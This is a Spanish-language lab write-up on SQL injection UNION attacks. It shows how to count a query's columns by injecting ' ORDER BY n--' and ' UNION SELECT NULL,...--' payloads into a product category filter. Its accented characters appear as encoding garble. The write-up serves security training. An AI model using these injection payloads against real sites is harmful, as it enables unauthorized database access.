Lab: SQL injection UNION attack, determining the number of columns returned by the query

üéØ Objetivo

Determinar el n√∫mero de columnas devueltas por una consulta SQL inyectando en el filtro de categor√≠a de producto.

- El M√©todo: ORDER BY

La forma m√°s r√°pida y limpia de contar columnas es usar la cl√°usula ORDER BY. 

Esta instrucci√≥n le dice a la base de datos: "Ordena los resultados por la columna n√∫mero X".

Si pides ordenar por la columna 1 y existe, la p√°gina carga bien.

Si pides ordenar por la columna 10 y solo hay 3, la base de datos da error.

- Pasos de la resoluci√≥n

Para este laboratorio, incrementamos el n√∫mero hasta encontrar el punto de ruptura:

Prueba 1: ' ORDER BY 1-- ‚Üí La p√°gina carga normal (Existe al menos 1 columna).

Prueba 2: ' ORDER BY 2-- ‚Üí La p√°gina carga normal (Existen al menos 2 columnas).

Prueba 3: ' ORDER BY 3-- ‚Üí La p√°gina carga normal (Existen al menos 3 columnas).

image:img/SQL-7.2.png[]

Prueba 4: ' ORDER BY 4-- ‚Üí ¬°ERROR! (La p√°gina muestra un mensaje de error o desaparecen los productos).

image:img/SQL-7.1.png[]


Resultado: El n√∫mero de columnas devueltas es 3.

- M√©todo Alternativo: UNION SELECT NULL

Otra forma es ir a√±adiendo valores NULL hasta que la p√°gina no d√© error. El NULL es ideal porque es compatible con casi cualquier tipo de datos (texto, n√∫mero, etc.).

' UNION SELECT NULL-- ‚Üí Error (las columnas no coinciden).

' UNION SELECT NULL, NULL-- ‚Üí Error.

' UNION SELECT NULL, NULL, NULL-- ‚Üí ¬°√âXITO! La p√°gina carga.

image:img/SQL-7.3.png[]